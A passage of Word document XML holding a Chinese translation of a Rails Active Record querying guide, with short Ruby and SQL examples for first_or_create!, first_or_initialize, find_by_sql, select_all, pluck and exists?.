              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="738740B6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你在创建新记录时没有传一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>orders_counts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的参数，那新记录就是不合法的，会抛出一个异常：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6FF39008" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="26CA8712" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where(:first_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Andy').first_or_create!(:locked</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42AC883E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; ActiveRecord::RecordInvalid: Validation failed: Orders count can't be blank</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6DE9771E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">同样，有一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_or_create_by!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法，但是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法更加清晰明确。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308BAF9D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">16.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_initialize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DCDB4B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_initialize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first_or_create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法差不多，只是它最后调用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 而不是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。那就是说一个新 model 实例创建在内存中，而没有保存到数据库中。继续上面的例子，我们现在再创建一个叫 ‘Nick’ 的记录：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="46EFC6F6" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28D5D478" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>nick = Client.where(:first_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Nick').first_or_initialize(:locked</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E44BBC3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; #&lt;Client id: nil, first_name: "Nick", orders_count: 0, locked: false, created_at: "2011-08-30 06:09:27", updated_at: "2011-08-30 06:09:27"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DE3FC36" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E4F6B53" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>nick.persisted?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57D52279" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26985533" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D0945D1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>nick.new_record?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="27C836EC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="77B0B34A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">因为这个对象还没有保存到数据库中，所以相应的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句就像这样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7799"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="00BF2816" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="50DB1B9D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="530070492"/>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clients WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(clients.first_name = 'Nick') LIMIT 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4071837F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想将它保存到数据库中，直接调用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>save</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 即可：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1296"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="650DD269" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DCE7F1F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>nick.save</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55EFA15A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E4DE261" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">17 直接用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句查找</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF29414" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想直接使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句查找记录，可以使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_by_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。这个方法即使结果只有一条记录也会返回一个包含记录集的数组。比如你可以执行下面的查询：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6359"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="10482834" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3127B23C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.find_by_sql("SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AED8216" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  INNER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>orders ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients.id = orders.cient_id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64A45B1C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ORDER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients.created_at desc")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3B3AFD00" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_by_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法提供了一种简单的调用数据库和查询实例对象的方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6108C5FC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">18 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>select_all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A03E59" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_by_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 有一个近似方法叫 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>connection#select_all</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。像 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_by_sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 一样， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>select_all</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法直接用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句从数据库里面查找数据，但是并不实例化它们。它会返回一个包含映射表的数组，每个映射表代表了一条记录。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8376"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="494B2A51" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2684A218" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="2049454781"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.connection.select_all("SELECT * FROM clients WHERE id = '1'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="63A336B9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">19 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>pluck</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0777341F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>pluck</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 用于从一个 model 相关的数据表中查询一个单独的列。它接受一个列名作为参数并以相应的数据类型返回一组值。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5136"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3E50552F" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="031745BC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where(:active</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true).pluck(:id)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EDAE0D0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># SELECT id FROM clients WHERE active = 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DEF6927" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04A1C2A1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.uniq.pluck(:role)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CB45C93" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># SELECT DISTINCT role FROM clients</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2AE0C77D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>pluck</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法实现了如下代码的的替换</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4416"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="39CA634E" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0C51D0F8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="2045254486"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.select(:id).map { |c| c.id }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="24507D6E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>替换为</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2256"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="003A83AD" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3EE8B37C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1126580390"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.pluck(:id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5FDA3F57" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>20 检查对象存在性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52BCCEFD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你仅仅想检查一条记录是否存在，可以使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>exists?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法。这个方法会像 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法一样查询数据库，但是它返回的是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2256"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="111F9517" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
